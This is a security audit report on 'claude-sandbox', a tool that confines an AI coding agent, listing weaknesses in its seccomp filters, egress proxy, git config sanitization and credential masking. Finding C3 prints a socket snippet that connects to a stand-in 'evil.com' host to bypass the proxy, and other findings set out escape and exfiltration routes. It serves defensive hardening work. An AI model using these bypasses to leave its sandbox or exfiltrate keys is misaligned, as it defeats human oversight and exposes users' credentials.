# Security Audit Report: claude-sandbox

**Date**: 2026-03-15
**Scope**: Full codebase review — architecture, egress filtering, seccomp/namespace isolation, credential protection, command filtering
**Method**: 4 parallel static code analysis passes by security engineers
**Status**: Initial findings — remediation in progress

---

## Executive Summary

The claude-sandbox demonstrates solid security foundations (`--clearenv`, `--cap-drop ALL`, seccomp BPF, x32 ABI blocking, credential masking). However, the audit uncovered **3 Critical**, **11 High**, **16 Medium**, and **7 Low** findings. Two systemic architectural weaknesses dominate:

1. **No network namespace isolation** — The sandbox shares the host network stack. The egress proxy is advisory-only (env vars), trivially bypassed by any direct socket connection. This undermines all egress filtering and enables credential exfiltration.
2. **Incomplete git config sanitization** — Only `~/.gitconfig` is sanitized. Per-repo `.git/config`, XDG config, `/etc/gitconfig`, and dangerous keys like `core.fsmonitor` are all unaddressed, allowing code execution via malicious repositories.

---

## Critical Findings

### C1: `io_uring` Syscalls Not Blocked by Default

**Severity**: CRITICAL
**Files**: `lib/seccomp.nix:14-64`, `lib/seccomp-gen.py:17-59`

The default blocked syscall list does not include `io_uring_setup` (425), `io_uring_enter` (426), or `io_uring_register` (427). These syscalls provide a massive kernel attack surface and have been the source of numerous privilege escalation CVEs (CVE-2021-41073, CVE-2022-29582, CVE-2023-2598, CVE-2024-0582). io_uring is blocked by default in Docker and many container runtimes.

The syscall numbers exist in `seccomp-gen.py` as optional extras but are not in `DEFAULT_BLOCKED` or in `seccomp.nix` at all.

**Exploitation**: A malicious process inside the sandbox could use io_uring to exploit kernel vulnerabilities for privilege escalation, or use io_uring's asynchronous I/O capabilities to perform operations that bypass other sandbox controls.

**Fix**: Add `io_uring_setup`, `io_uring_enter`, and `io_uring_register` to the default blocked lists in both `seccomp.nix` and `seccomp-gen.py`.

### C2: `unshare` and `setns` Syscalls Not Blocked

**Severity**: CRITICAL
**Files**: `lib/seccomp.nix:14-64`

The `unshare(2)` and `setns(2)` syscalls are not blocked. A sandboxed process can create nested namespaces, gain capabilities within them, or attempt to re-enter host namespaces via `/proc` entries. Combined with `clone` (also not blocked), a sandboxed process can create a child with new user/mount namespaces and gain `CAP_SYS_ADMIN` in the new user namespace.

**Fix**: Add `unshare`, `setns` to default blocked lists. These are not needed by standard development tools.

### C3: Egress Proxy Is Advisory Only — Direct Connection Bypass

**Severity**: CRITICAL
**Files**: `lib/sandbox.sh:367-368,601-610`, `lib/egress-proxy.py`

The egress filter relies entirely on `HTTP_PROXY`/`HTTPS_PROXY` environment variables. The network namespace is explicitly NOT unshared (`# Keep network (Claude needs API access)`). There is no `--unshare-net`, no iptables rules, and no network-level enforcement. Any process can make direct TCP connections bypassing the proxy entirely.

**Exploitation**:
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("evil.com", 443))  # Direct connection, proxy never involved
```

**Fix**: Use `--unshare-net` with a veth pair or slirp4netns for controlled network access. At minimum, document the limitation prominently.

---

## High Findings

### H1: Per-Repository `.git/config` Not Sanitized

**Severity**: HIGH
**Files**: `lib/sandbox.sh:436`, `lib/sanitize-git.sh`

The project directory is mounted read-write. The repo-level `.git/config` can contain `credential.helper`, `core.sshCommand`, `core.hooksPath`, `core.fsmonitor`, `filter.*.clean`, `filter.*.smudge`, `include.path` — all code execution vectors. A malicious repository can exploit this when Claude runs any git command.

**Fix**: Use `GIT_CONFIG_COUNT`/`GIT_CONFIG_KEY_n`/`GIT_CONFIG_VALUE_n` env vars (highest precedence) to override dangerous keys.

### H2: ANTHROPIC_API_KEY Exposed with Unrestricted Network

**Severity**: HIGH
**Files**: `lib/sandbox.sh:597-599`

The API key is forwarded into the sandbox environment. Combined with unrestricted network access (C3), any process can exfiltrate it.

**Fix**: Implement network namespace isolation (C3 fix), or use a token broker pattern.

### H3: DNS Exfiltration Channel

**Severity**: HIGH
**Files**: `lib/egress-proxy.py`, `lib/sandbox.sh:402-416`

DNS resolution happens via the system resolver, not through the proxy. Data can be exfiltrated via DNS queries (~KB/s) without touching the proxy.

**Fix**: Route DNS through a filtering resolver that applies whitelist/blacklist rules.

### H4: Proxy Environment Variables Can Be Unset

**Severity**: HIGH
**Files**: `lib/sandbox.sh:601-610`

Processes inside the sandbox can `unset HTTP_PROXY HTTPS_PROXY` and connect directly. Environment variables cannot be made immutable.

**Fix**: Network-level enforcement (C3) is the only reliable solution.

### H5: Proxy Crash Results in Fail-Open

**Severity**: HIGH
**Files**: `lib/egress-proxy.py:252-257`, `lib/sandbox.sh:283-303`

If the proxy crashes, the sandbox continues running without filtering. No health monitoring or watchdog exists.

**Fix**: Implement a proxy health-check that kills the sandbox if the proxy dies.

### H6: `seccomp(2)` Syscall Not Blocked

**Severity**: HIGH
**Files**: `lib/seccomp.nix:14-64`

The `seccomp` syscall itself is not blocked. A sandboxed process can install additional BPF programs to exercise BPF verifier bugs in the kernel.

**Fix**: Add `seccomp` to the default blocked list.

### H7: `CLAUDE_SANDBOX_NO_SECCOMP` Escape Hatch

**Severity**: HIGH
**Files**: `lib/sandbox.sh:535-542`

An environment variable can disable all seccomp filtering. A sandbox without seccomp is not a sandbox.

**Fix**: Remove the escape hatch. Always fail hard if the seccomp profile is missing.

### H8: Arbitrary Nix Package Resolution

**Severity**: HIGH
**Files**: `lib/sandbox.sh:224-238`

The `packages` config array runs `nix build "nixpkgs#${pkg}"` with unvalidated user input. A malicious entry like `../../some-flake#malicious-drv` could cause code execution on the host.

**Fix**: Validate package names against `^[a-zA-Z0-9._-]+$` before passing to `nix build`.

### H9: XDG/System Git Config Not Sanitized

**Severity**: HIGH
**Files**: `lib/sanitize-git.sh:12-13`, `lib/sandbox.sh:318-320`

Only `~/.gitconfig` is sanitized. `$XDG_CONFIG_HOME/git/config` and `/etc/gitconfig` are not processed. Set `GIT_CONFIG_NOSYSTEM=1` and sanitize XDG config.

### H10: GIT_CONFIG_* Environment Variables Not Blocked

**Severity**: HIGH
**Files**: `lib/sandbox.sh:613-619`

The user config `env` array can forward `GIT_CONFIG_GLOBAL`, `GIT_DIR`, `GIT_SSH_COMMAND`, etc., completely bypassing git sanitization.

**Fix**: Add a denylist for dangerous git environment variables in the forwarding loop.

### H11: Command Filter Trivially Bypassed

**Severity**: HIGH
**Files**: `lib/command-filter.sh:42-88`

The PATH-based filter is bypassed by absolute paths, interpreters (`python3 -c "..."`), `env` command, or `bash -c`. Since `--ro-bind / /` exposes all binaries, this is trivial.

**Fix**: Document as advisory. For stronger enforcement, consider seccomp `execve` filtering.

---

## Medium Findings

| # | Finding | File |
|---|---------|------|
| M1 | `memfd_create` not blocked — fileless code execution | `seccomp.nix:14-64` |
| M2 | Seccomp uses EPERM not KILL_PROCESS — allows filter probing | `seccomp.nix:226-227` |
| M3 | `/proc` exposure leaks host info (`kallsyms`, `keys`, `sysrq-trigger`) | `sandbox.sh:383` |
| M4 | PID/user namespace degradation without warning | `sandbox.sh:355-365`, `detect.sh:24-28` |
| M5 | `mknod`/`mknodat` not blocked | `seccomp.nix:14-64` |
| M6 | `prctl` not blocked — `PR_SET_DUMPABLE` implications | `seccomp.nix:14-64` |
| M7 | WSL2 `binfmt_misc` interop not fully mitigated | `sandbox.sh:464-481` |
| M8 | SSH agent default-on (`FORWARD_SSH=1`) — full key usage | `sandbox.sh:95,516-518` |
| M9 | `--extra-bind` allows arbitrary rw mounts with no blocklist | `sandbox.sh:484-505` |
| M10 | Arbitrary env var forwarding — no blocklist for `LD_PRELOAD` etc. | `sandbox.sh:256-258,612-619` |
| M11 | TOCTOU in temp dir cleanup — symlink race in credential scrub | `sandbox.sh:281-301` |
| M12 | `~/.claude/.credentials.json` readable inside sandbox via ro-bind | `sandbox.sh:440-442` |
| M13 | `core.fsmonitor`, `core.pager`, `diff.external` not stripped | `sanitize-git.sh:39-52` |
| M14 | sed section removal fails on indented `[credential]` headers | `sanitize-git.sh:39-45` |
| M15 | Missing credential dir masks (`.docker`, `.azure`, `.config/gcloud`, `.npmrc`) | `sandbox.sh:458-462` |
| M16 | Credential scrubbing only targets single file | `sandbox.sh:291-301` |

---

## Low Findings

| # | Finding | File |
|---|---------|------|
| L1 | IPv6 address parsing edge cases in proxy `_extract_host` | `egress-proxy.py:70-79` |
| L2 | JSON injection in egress config bash string concatenation | `egress-filter.sh:32-51` |
| L3 | Proxy startup port race condition (TOCTOU in `find_free_port`) | `egress-filter.sh:57-88`, `egress-proxy.py:215-219` |
| L4 | Non-HTTP protocols unfiltered (FTP, WebSocket, raw TCP) | `egress-proxy.py` |
| L5 | HTTP request smuggling via `Content-Length` + `Transfer-Encoding` | `egress-proxy.py:132-185` |
| L6 | Entire host filesystem readable via `--ro-bind / /` | `sandbox.sh:379` |
| L7 | Security tests have coverage gaps and always-pass egress tests | `security-tests.sh:616-635` |

---

## Prioritized Remediation Roadmap

### Immediate (this week)
1. Block dangerous syscalls: `io_uring_*`, `unshare`, `setns`, `seccomp`, `memfd_create`, `mknod/mknodat` (C1, C2, H6, M1, M5)
2. Remove `CLAUDE_SANDBOX_NO_SECCOMP` escape hatch (H7)
3. Fix git sanitization: XDG + system config, `GIT_CONFIG_COUNT` overrides for repo-level keys (H1, H9, H10, M13)
4. Validate Nix package names (H8)

### Short-term (next sprint)
5. Network namespace isolation (`--unshare-net` + veth/slirp4netns) (C3, H2, H3, H4, H5)
6. Mask sensitive `/proc` entries, warn on namespace degradation (M3, M4)
7. Default SSH agent to off (M8)
8. Mask `~/.claude/.credentials.json` with `--ro-bind /dev/null` (M12)
9. Add env var + bind mount blocklists (M9, M10)
10. Use `jq` for egress config JSON generation (L2)

### Medium-term (backlog)
11. Document command filter as advisory (H11)
12. Add missing credential directory masks (M15)
13. Expand credential scrubbing to all sensitive files (M16)
14. Consider `SECCOMP_RET_KILL_PROCESS` for most dangerous syscalls (M2)
15. Fix security test coverage gaps (L7)
